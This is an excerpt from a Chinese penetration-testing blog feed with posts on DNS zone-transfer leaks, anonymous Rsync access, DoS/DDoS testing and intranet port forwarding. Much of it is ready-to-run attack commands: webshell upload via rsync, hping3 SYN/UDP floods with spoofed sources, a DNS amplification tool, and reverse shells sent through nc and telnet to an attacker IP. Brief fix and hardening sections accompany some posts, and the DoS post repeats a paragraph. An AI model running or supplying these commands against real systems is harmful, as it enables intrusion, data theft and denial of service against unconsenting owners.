<h2><span id="简介">简介</span></h2><p>Dns是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
<h2><span id="成因">成因</span></h2><p>DNS服务器的主备数据同步，使用的是域传送功能。 域传送关键配置项为：</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>options配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">options &#123;  </span><br><span class="line">listen-on &#123; 1.1.1.1; &#125;;  </span><br><span class="line">listen-on-v6 &#123; any; &#125;;  </span><br><span class="line">directory &quot;/bind&quot;;  </span><br><span class="line">pid-file &quot;/bind/run/pid&quot;;  </span><br><span class="line">dump-file &quot;/bind/data/named_dump.db&quot;;  </span><br><span class="line">statistics-file &quot;/bind/data/named.stats&quot;;</span><br><span class="line"></span><br><span class="line">    allow-transfer  &#123; any; &#125;;</span><br><span class="line">    allow-query    &#123;any;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>zone配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zone &quot;wooyun.org&quot; &#123;  </span><br><span class="line">type master;  </span><br><span class="line">file &quot;/bind/etc/wooyun.org.conf&quot;;  </span><br><span class="line">allow-transfer &#123;any;&#125;;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>笔者测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<h2><span id="攻击方式及危害">攻击方式及危害</span></h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置。</p>
<h2><span id="漏洞利用方式">漏洞利用方式</span></h2><h3><span id="window利用方式">window利用方式</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">server dns.xx.com</span><br><span class="line">ls xx.com</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns.jpg" alt=""></p>
<h3><span id="linux利用方式">linux利用方式</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @dns.xx.com. axfr xx.com</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns2.jpg" alt=""></p>
<h2><span id="修复方案">修复方案</span></h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-64.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/papers-64.html</a></p>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[配置漏洞之Rsync匿名访问]]></title>
      <url>https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="rsync简介">Rsync简介</span></h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
<p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
<p>rsync 包括如下的一些特性：</p>
<ul>
<li>能更新整个目录和树和文件系统；</li>
<li>有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等；</li>
<li>对于安装来说，无任何特殊权限要求；</li>
<li>对于多个文件来说，内部流水线减少文件等待的延时；</li>
<li>能用rsh、ssh 或直接端口做为传输入端口；</li>
<li>支持匿名rsync 同步文件，是理想的镜像工具；</li>
</ul>
<h2><span id="寻找匿名访问rsync方式">寻找匿名访问Rsync方式</span></h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n --open -p 873 X.X.X.X/24</span><br></pre></td></tr></table></figure></p>
<h2><span id="漏洞利用常用操作">漏洞利用常用操作</span></h2><h3><span id="例举整个同步目录或指定目录">例举整个同步目录或指定目录</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync 10.0.0.12::</span><br><span class="line">rsync 10.0.0.12::www/</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync1.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync2.jpg" alt=""></p>
<h3><span id="下载文件或目录到本地">下载文件或目录到本地</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz 10.0.0.12::www/test.php /root</span><br><span class="line">rsync -avz 10.0.0.12::www/ /var/tmp</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync3.jpg" alt=""></p>
<h3><span id="上传本地文件到服务端">上传本地文件到服务端</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz webshell.php 10.0.0.12::www/</span><br></pre></td></tr></table></figure>
<h2><span id="漏洞利用实例">漏洞利用实例</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/rsync.jpg" alt=""></p>
<h2><span id="自动化脚本">自动化脚本</span></h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
<p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="noopener">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
<h2><span id="安全配置注意事项">安全配置注意事项</span></h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
<h3><span id="限定ip的两种方式">限定IP的两种方式</span></h3><p>IPTables防火墙</p>
<p>给rsync的端口添加一个iptables。</p>
<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>除此之外rsyncd.conf中的hosts allow也可以设置只允许来源ip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts allow = X.X.X.X #允许访问的IP</span><br></pre></td></tr></table></figure>
<h3><span id="添加用户口令">添加用户口令</span></h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</span><br><span class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</span><br></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="noopener">http://www.91ri.org/11093.html</a></p>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈ddos的测试方法]]></title>
      <url>https://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
<h2><span id="dos与ddos的区别">DOS与DDOS的区别</span></h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<h2><span id="dos的类型">DOS的类型</span></h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ddos.jpg" alt=""></p>
<h2><span id="网络和传输层攻击">网络和传输层攻击</span></h2><p>这种攻击方式通常是向服务器发送恶意流量，尽可能消耗服务器的资源来达到拒绝服务的目的。</p>
<h3><span id="tcp-syn-floods">TCP SYN floods</span></h3><p>SYN洪水攻击在传输层，为了更好的理解这种类型的攻击，我们需要先了解TCP的三次握手。</p>
<p>先来看张图如下：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ddos1.jpg" alt=""></p>
<p>对照上图来理解一下：</p>
<p>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p>
<p>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。</p>
<p>如果攻击者发送足够的SYN数据包，因为服务器的并发TCP连接数量有限所以会导致服务器没有更多的资源可用。 如果服务器达到限制，在现有的处于SYN-RCVD状态的连接超时之前则不能在建立新的连接，这就造成了拒绝服务攻击。</p>
<p>SYN洪水攻击测试工具，我们可以用hping3，下载地址：<a href="http://www.hping.org/hping3.html" target="_blank" rel="noopener">http://www.hping.org/hping3.html</a></p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 简单例子： hping3 -S --flood -V -p TARGET_PORT TARGET_SITE</span><br><span class="line"></span><br><span class="line">2 随机源IP： hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE</span><br></pre></td></tr></table></figure>
<h3><span id="udp-floods">UDP floods</span></h3><p>UDP协议是无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
<p>由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击的原理是通过伪造的IP向目标服务器发送大量的UDP数据包，服务器在接收到数据包后无法处理每一条请求，并且通过向服务器发送ICMP “destination unreachable”来消耗其带宽。</p>
<p>测试工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 hping3 命令：hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP</span><br><span class="line"></span><br><span class="line">2 loic 下载地址： https://sourceforge.net/projects/loic/</span><br></pre></td></tr></table></figure>
<h3><span id="tcp-fin-flood">TCP FIN Flood</span></h3><p>这种FIM标志的数据包只有在TCP建立连接之后才会被接受，如果没有建立TCP连接，那么这个标志的数据包将会被简单的删除处理。</p>
<p>如果攻击者只是在没有建立TCP连接的情况下对服务器进行泛洪攻击，那么FIN数据包将会别丢弃，但是服务器还是会分配一些资源来查看数据包防止冗余。</p>
<p>这种攻击很容易被实现。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP</span><br></pre></td></tr></table></figure>
<h3><span id="tcp-rst-flood">TCP RST Flood</span></h3><p>TCP中的RST包的意思是立即断开连接，当连接出错需要停止掉的时候非常有用。</p>
<p>如果攻击者能够以某种方式查看从源到目的地的流量，则可以发送具有适当值的RST报文（源IP，目的IP，源端口，目的端口，序列号等），该报文将断开源和目的地之间的TCP连接。 这也是一种拒绝服务的方式。</p>
<p>RST泛洪的测试工具也是hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP</span><br></pre></td></tr></table></figure>
<h3><span id="push-and-ack-flood">PUSH and ACK Flood</span></h3><p>通过大量的PUSH和ACK泛洪可以是服务器停止对正常用户的请求进行响应。</p>
<p>测试工具：hping3 和 LOIC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP</span><br></pre></td></tr></table></figure>
<h3><span id="icmp-and-igmp-floods">ICMP and IGMP Floods</span></h3><p>ICMP（Internet Control Message Protocol–Internet控制消息协议）和IGMP（Internet Group Management Protocol–Internet组管理协议）是网络层的协议类似于UDP。ICMP递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP是IP网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。</p>
<p>ICMP and IGMP Floods类似于UDP不需要任何漏洞，只需要发送大量的ICMP或IGMP数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP</span><br></pre></td></tr></table></figure>
<h2><span id="放大攻击">放大攻击</span></h2><p>利用回复包比请求包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标。例如：攻击者伪造源IP为目标的IP然后使用路由广播IP地址向多个IP发送消息，然后这些设备都向目标IP进行回应。如图：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ddos2.jpg" alt=""></p>
<p>想要使用放大攻击必须使用不需要验证源IP的无连接协议，像DNS、ICMP（ Smurf attack）、UDP（Fraggle attack）等协议。</p>
<h3><span id="smurf-attack">Smurf Attack</span></h3><p>攻击者会选择一些中间站点作为放大器，然后发送巨大数量ICMP（ping）请求到这些中间站点的广播IP。通过这种方式，将所有的源IP改为目标的IP地址，这些中间地址将这些数据包广播到所有子网的主机。最后所有主机的回应都发回给目标。</p>
<p>测试工具:hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：hping3 --icmp --spoof TARGET_IP BROADCAST_IP</span><br></pre></td></tr></table></figure>
<h3><span id="dns-amplification">DNS Amplification</span></h3><p>当前许多DNS服务器支持EDNS。EDNS是DNS的一套扩大机制，RFC 2671对此有介绍。一些选择能够让DNS回复超过512字节并且仍然使用UDP，如果要求者指出它能够处理这样大的DNS查询的话。攻击者已经利用这种方法产生了大量的通讯。通过发送一个60个字节的查询来获取一个大约4000个字节的记录，攻击者能够把通讯量放大66倍。一些这种性质的攻击已经产生了 每秒钟许多GB的通讯量，对于某些目标的攻击甚至超过了每秒钟10GB的通讯量。<br>下面看两个图，正常的查询:</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ddos3.jpg" alt=""></p>
<p>下面是放大攻击的图：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ddos4.jpg" alt=""></p>
<p>对比上面的连个图，发下放大攻击之后有大量的数据查询后的响应数据包返回给受害者的机器，这样就造成了对受害者的拒绝服务攻击。</p>
<p>测试工具：Tsunami</p>
<p>下载地址： <a href="https://www.infosec-ninjas.com/tsunami" target="_blank" rel="noopener">https://www.infosec-ninjas.com/tsunami</a></p>
<p>测试命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 收集dns服务器 ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8</span><br><span class="line"></span><br><span class="line">2 对目标进行攻击 ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt</span><br></pre></td></tr></table></figure>
<h3><span id="fraggle-attack">Fraggle Attack</span></h3><p>攻击者向UDP端点发送大量的欺骗UDP洪促使这些端口回应目标。</p>
<h2><span id="应用层攻击">应用层攻击</span></h2><p>应用层攻击也叫第七层攻击，可以实行DoS和DDoS攻击，这种类型的攻击是基于模仿人的行为。</p>
<p>可能被利用的协议包括HTTP、HTTPS、DNS、SMTP、FTP、VOIP和其他的应用协议</p>
<h3><span id="http泛洪">HTTP泛洪</span></h3><p>HTTP泛洪是应用层攻击中最常见的攻击方式。</p>
<p>这种类型的攻击可以尝试使用HTTP GET或者POST方式向服务器发出请求。通常来说需要多个电脑同时发出请求。</p>
<p>测试工具：</p>
<p>1 LOIC</p>
<p>2 hulk <a href="http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/" target="_blank" rel="noopener">http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:python hulk.py -site http://TARGET.com/test/</span><br></pre></td></tr></table></figure>
<p>3 Apache JMeter <a href="https://jmeter.apache.org/" target="_blank" rel="noopener">https://jmeter.apache.org/</a></p>
<h3><span id="dns泛洪">DNS泛洪</span></h3><p>DNS泛洪像其他洪水攻击一样，DNS泛宏攻击的目的是向DNS应用发送大量DNS请求。DNS服务器不堪重负，无法处理来自其他用户的所有合法请求。</p>
<p>测试工具：</p>
<p>1 mz <a href="http://www.perihel.at/sec/mz/" target="_blank" rel="noopener">http://www.perihel.at/sec/mz/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：mz -A rand -B TARGET_DNS_SERVER -t dns &quot;q=pentest.blog&quot; -c 10000000</span><br></pre></td></tr></table></figure>
<p>2 netstressng <a href="https://sourceforge.net/projects/netstressng/" target="_blank" rel="noopener">https://sourceforge.net/projects/netstressng/</a></p>
<p>命令：netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53</p>
<h3><span id="low和slow攻击">Low和Slow攻击</span></h3><p>这个攻击不像其他的泛洪攻击，他不需要大量的数据流量。这种类型的攻击针对的是应用程序和服务器资源。</p>
<p>这种方式很难被检测，因为其流量跟正常流量没什么两样。</p>
<p>测试工具：<a href="https://github.com/llaera/slowloris.pl" target="_blank" rel="noopener">https://github.com/llaera/slowloris.pl</a></p>
<p>这个工具的原理就是通过打开多个连接并保持连接，直到服务器无法处理跟多的http请求，导致拒绝服务。</p>
<h2><span id="总结">总结</span></h2><p>这里说了这么多关于拒绝服务的方式，我知道这些内容并不是很全，而且解释的也比较简单，没有深入去解释各种协议，这些基础的东西就需要大家自行去研究学习。这里只是做一个简要介绍做个笔记。里面涉及的攻击就只能请大家自行测试了 。</p>
<p>原文链接：<a href="https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw</a></p>
]]></content>
      
        <categories>
            
            <category> 技巧 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[内网渗透中转发工具总结]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="lcx转发">LCX转发</span></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
<p>首先在本地进行监听，监听51端口并转发到33891端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 51 33891</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx1.png" alt=""></p>
<p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
<p>将内网(192.168.1.128)的3389端口转发到公网(192.168.1.110)的51端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –slave 192.168.1.110 51 192.168.1.128 3389</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx2.png" alt=""></p>
<p>远程桌面访问33891端口</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx3.png" alt=""></p>
<h2><span id="nc转发">NC转发</span></h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
<h3><span id="正向连接">正向连接</span></h3><p>在靶机上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc1.png" alt=""></p>
<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc2.png" alt=""></p>
<h3><span id="反向连接">反向连接</span></h3><p>在本机运行上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc3.png" alt=""></p>
<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc4.png" alt=""></p>
<h2><span id="redduh内网反弹">Redduh内网反弹</span></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
<p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reDuh1.png" alt=""></p>
<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reDuh2.png" alt=""></p>
<p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</span><br></pre></td></tr></table></figure></p>
<p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv localhost 1010</span><br><span class="line">[createTunnel]1235:127.0.0.1:3389</span><br></pre></td></tr></table></figure></p>
<p>远程登录<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
<h2><span id="tunna内网反弹">Tunna内网反弹</span></h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna0.png" alt=""></p>
<p>这里使用php网站进行测试，上传php后门<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna4.png" alt=""></p>
<p>远程连接<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
<h2><span id="linux系统通过nc反弹shell">Linux系统通过nc反弹shell</span></h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
<p>首先，攻击端进行监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
<p>服务端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc3.png" alt=""></p>
<p>执行命令，查看发现反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
<h2><span id="内置命令反弹">内置命令反弹</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
<p>服务器端执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc4.png" alt=""></p>
<p>反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
<h2><span id="regeorgproxifier正向代理">reGeorg+proxifier正向代理</span></h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
<p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
